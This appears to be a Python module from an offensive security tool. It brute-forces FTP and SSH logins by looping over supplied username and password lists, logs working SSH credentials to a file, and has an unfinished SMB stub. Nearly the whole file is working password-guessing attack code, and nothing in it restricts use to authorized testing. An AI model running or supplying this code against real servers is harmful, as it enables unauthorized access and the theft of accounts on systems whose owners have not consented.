## Necessary library 
import ftplib
import time
import paramiko
import socket

## For Errors
from contextlib import closing
from paramiko.ssh_exception import (
    AuthenticationException,
    SSHException,
    NoValidConnectionsError
) 

## Custom Modules 
from utils.print import info, success, warning, error
from utils.common import loadListOrValue

## Func to check if the port its open 
def portOpen(ip: str, port: int, timeout: float = 3.0) -> bool:
    'Returns True if the port is open, False if it is closed/filtered.'
    try:
        with closing(socket.create_connection((ip, port), timeout)):
            return True
    except OSError:
        return False

## Brute force attack on service FTP, it requires IP, the user, the pass, port and check if you want to see the errors.
def bruteFtp(ip, userlist, passlist, port=21, verbose=False):
    ## Check if the port its open
    if not portOpen(ip, port):
        error(f"❌ {ip}:{port} is not responding on TCP. Is the port correct?")
        return
    ## Check if the user is giving a text file or a value
    users = loadListOrValue(userlist)
    pwds  = loadListOrValue(passlist)

    ## Check if the user or password value is given 
    if not users or not pwds:
        error("❌ User or password file is empty.")
        return

    ## For every pass and user given do connection to FTP
    for usr in users:
        for pwd in pwds:
            session = ftplib.FTP()
            try: ## try to connect with every value in a loop, uses IP, Port, and has a timeout set of 5 sec.
                session.connect(ip, port, timeout=5)
                session.login(usr, pwd)
                success(f"✅ Successful login: {usr}:{pwd}") ## if it works, print and stop trying.
                session.quit()
                return
            except ftplib.error_perm: ## if login fails
                if verbose:
                    error(f"❌ Failed: {usr}:{pwd}")
            except Exception as e: ## for other errors
                warning(f"⚠️  Error with {usr}:{pwd} -> {e}")
            finally:
                try:
                    session.quit() ## when done, close session
                except:
                    pass
            time.sleep(0.2) ## wait to avoid flooding

## Brute force attack on service SSH, it requires IP, the user, the pass, port and check if you want to see the errors.
def bruteSsh(ip, userlist, passlist, port=22, verbose=False):

    ## Check if the service is responding in the right port 
    if not portOpen(ip, port):
        error(f"❌ {ip}:{port} is not responding on TCP. Is the port correct?")
        return

    ## Check if the user is giving a text file or value for user and password
    users = loadListOrValue(userlist)
    pwds  = loadListOrValue(passlist)

    ## Check if the lists are empty
    if not users or not pwds:
        error("❌ User or password file is empty.")
        return

    ## For every user and password do connection to SSH
    for usr in users:
        for pwd in pwds:
            client = paramiko.SSHClient()
            client.load_system_host_keys()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            try:
                ## Try to connect using paramiko
                client.connect(
                    ip,
                    port=port,
                    username=usr,
                    password=pwd,
                    timeout=5,
                    banner_timeout=5,
                    look_for_keys=False,
                    allow_agent=False
                )
                success(f"✅ Successful login: {usr}:{pwd}") ## if it works, print success
                with open("ssh_hits.txt", "a") as f:
                    f.write(f"{ip}:{port} - {usr}:{pwd}\n")
                client.close()
                return

            except AuthenticationException: ## wrong credentials
                if verbose:
                    error(f"❌ Failed: {usr}:{pwd}")

            except NoValidConnectionsError: ## connection refused
                error(f"❌ Connection refused on {ip}:{port}. Check the port or firewall.")
                return

            except (socket.timeout, socket.error) as e: ## general socket errors
                if verbose:
                    warning(f"⚠️  Error with {usr}:{pwd} -> {e}")

            except SSHException as e: ## banner error or other SSH-related issues
                if "Error reading SSH protocol banner" in str(e):
                    error(f"❌ Could not establish SSH connection to {ip}:{port}. Are you using the correct port?")
                    return
                elif verbose:
                    warning(f"⚠️  SSHException with {usr}:{pwd} -> {e}")

            finally:
                try:
                    client.close()
                except:
                    pass

            time.sleep(0.2)

    error("❌ No valid SSH credentials were found.")

## Brute force attack on service SMB, it requires IP, the user, the pass, port and check if you want to see the errors.
def bruteSmb(ip,userlist,passlist,port=445,verbose=False):
    
    ## Check if the service is responding in the right port 
    if not portOpen(ip, port):
        error(f"❌ {ip}:{port} is not responding on TCP. Is the port correct?")
        return
    
    ## Check if the user is giving a text file or value for user and password
    users = loadListOrValue(userlist)
    pwds  = loadListOrValue(passlist)

    if not users or not pwds:
        error("❌ User or password file is empty.")
        return
    
    warning("🌐 SMB form module not yet implemented.")


## Entry point to run the brute force attack based on type
def run(type, ip, userlist, passlist, port=None, verbose=False):
    if type == "ftp":
        bruteFtp(ip, userlist, passlist, port or 21, verbose)
    elif type == "ssh":
        bruteSsh(ip, userlist, passlist, port or 22, verbose)
    elif type == '':
        bruteSmb(ip,userlist,passlist, port or 445, verbose)
    else:
        error(f"❌ Unrecognized attack type '{type}'.")
